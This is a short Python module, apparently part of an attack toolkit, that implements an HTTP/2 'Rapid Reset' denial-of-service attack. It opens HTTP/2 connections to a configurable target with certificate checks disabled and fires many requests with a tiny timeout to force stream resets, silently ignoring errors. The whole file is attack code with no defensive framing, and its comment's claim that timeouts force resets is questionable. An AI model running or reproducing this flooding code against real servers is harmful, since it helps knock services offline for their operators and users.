# attacks/h2_rst.py
import httpx
from .base import AttackBase

class H2RapidReset(AttackBase):
    def __init__(self, *args, streams=100, **kwargs):
        super().__init__(*args, **kwargs)
        self.streams = streams

    def worker(self):
        with httpx.Client(http2=True, verify=False) as client:
            for _ in range(self.streams):
                try:
                    # Send request and immediately close to force RST
                    client.get(f"https://{self.target}:{self.port}/", timeout=0.05)
                except:
                    pass
        return 0